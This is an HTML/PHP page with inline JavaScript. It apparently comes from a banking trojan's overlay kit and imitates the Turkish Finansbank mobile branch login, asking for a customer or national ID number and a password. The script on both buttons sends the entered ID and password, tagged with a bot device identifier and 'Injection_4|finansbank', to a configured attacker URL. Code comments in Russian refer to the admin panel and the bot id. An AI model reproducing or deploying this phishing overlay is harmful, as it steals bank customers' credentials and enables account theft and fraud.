<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Financsbank</title>
    <style>
        html, body {
            text-align: center;
            position: relative;
            padding: 0;
            margin: 0;
            width: 100%;
            color: #555;
            font-family: Arial, serif;
            background: #e3e3e3;
        }

        input[type="text"]::-webkit-input-placeholder {
            color: #e28990;
        }

        input[type="text"]:focus {
            outline: none;
        }

        input[type="password"]:focus {
            outline: none;
        }

        input[type="number"]:focus {
            outline: none;
        }

        input[type=number]::-webkit-inner-spin-button,
        input[type=number]::-webkit-outer-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }

        h4 {
            color: #eb0779;
            text-align: left;
            font: 14px "PT Sans";
            margin-left: 3%;
        }

        .input-field {
            margin-top: 10px;
            border: 0;
            background: #fff;
            height: 36px;
            width: 95%;
            margin-left: 2%;
            font-family: "Consolas",serif;
            font-size: 18px;
            margin-right: 2%;
            color: black;
            padding-left: 10px;
            padding-right: 10px;
        }

        #id:focus {
            border: 0;
        }

        #password:focus {
            border: 0;
        }

        .submit-button {
            width: 95%;
            height: 36px;
            border: 0;
            position: relative;
            font-family: "PT Sans",serif;
            font-size: 16px;
            font-weight: normal;
            color: white;
            margin-top: 15px;
            cursor: pointer;

            background: #2d4fab;;
        }

        .header {
            color: #252747;
            font: 18px "PT Sans";
            margin-top: 20px;
        }

        .message {
            color: #252747;
            font: 14px "PT Sans";
            text-align: left;
            position: relative;
            margin-left: 2.5%;
            float: left;
        }

        .input-checkbox {
            right: 3.5%;
            position: absolute;
        }

        .clear {
            clear: both;
        }

        .fielderror {
            border: 2px solid #f00;
			margin-top: 10px;
            background: #fff;
            height: 36px;
            width: 95%;
            margin-left: 2%;
            font-family: "Consolas",serif;
            font-size: 18px;
            margin-right: 2%;
            color: black;
            padding-left: 10px;
            padding-right: 10px;
        }
    </style>
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>

    <div id="content_div">

        <div class="header">Financsbank Cep &#350;ubesi'ne ho&#351; geldiniz.</div>

        <form action="null" method="post" id="_mainForm" target="flow_handler">
            <input type="hidden" name="name" value="Finansbank Cep Şubesi">

            <input type="number" name ="M&#252;&#351;teri / TC Kimlik Numaran&#305;z" id="id" maxlength="12" class="input-field" placeholder="M&#252;&#351;teri / TC Kimlik Numaran&#305;z" onKeyUp="if(this.value>999999999999999){this.value=this.value.substr(0,15);}" autofocus="autofocus" />

            <script>
                document.getElementById('id').onkeypress = function (e) {
                    return !(/[А-Яа-яA-Za-z ]/.test(String.fromCharCode(e.charCode)));
                }
            </script>
            <input type="password" name="&#350;ifreniz" id="password" class="input-field" placeholder="&#350;ifreniz" maxlength="12" />

            <h4>*TC Kimlik Numaras&#305; ile yaln&#305;zca Bireysel M&#252;&#351;terilerimiz giri&#351; yapabilmektedir.</h4>
            <div class="message">Beni Hat&#305;rla</div>

            <input type="checkbox" class="input-checkbox" />

            <div class="clear"></div>

            <button id="submitBtn1" class="submit-button">Giri&#351;</button>
            <button id="submitBtn2" class="submit-button">&#350;ifremi Unuttum/Yok</button>
        </form>

        <br />
        <br />
        <iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
    </div>

    <script type="text/javascript">



				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };


                   /* var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');

					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;

                    g_oForm.setAttribute('action',g_sFAct); // устанавливаем у формы урл админки
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};

					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // получаем id бота

*/
                    var g_oBtn = document.getElementById('submitBtn1');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('id');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'input-field';
						} catch(e){};

                        if (oNumInp.value.length < 9) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{4,6}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
					top['closeDlg'] = true;
					/*prompt('send', '{"dialog id" : "finansbank_btn1'+
					'", "Musteri_tc_kimlik_numaraniz": "'+oNumInp.value+
					'", "sifreniz": "'+oCodeInp.value+'"}');

						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();*/


						var url='<?php echo $URL; ?>';
						var imei_c='<?php echo $IMEI_country; ?>';
						location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|finansbank|"+oNumInp.value+"|"+oCodeInp.value+"|");


						return false;
                    };

					                    var g_oBtn = document.getElementById('submitBtn2');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('id');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'input-field';
						} catch(e){};

                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
					top['closeDlg'] = true;
					/*prompt('send', '{"dialog id" : "finansbank_btn2'+
					'", "Musteri_tc_kimlik_numaraniz": "'+oNumInp.value+
					'", "sifreniz": "'+oCodeInp.value+'"}');

						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();*/

						var url='<?php echo $URL; ?>';
						var imei_c='<?php echo $IMEI_country; ?>';
						location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|finansbank|"+oNumInp.value+"|"+oCodeInp.value+"|");



						return false;
                    };

                })();
            </script>
</body>
</html>
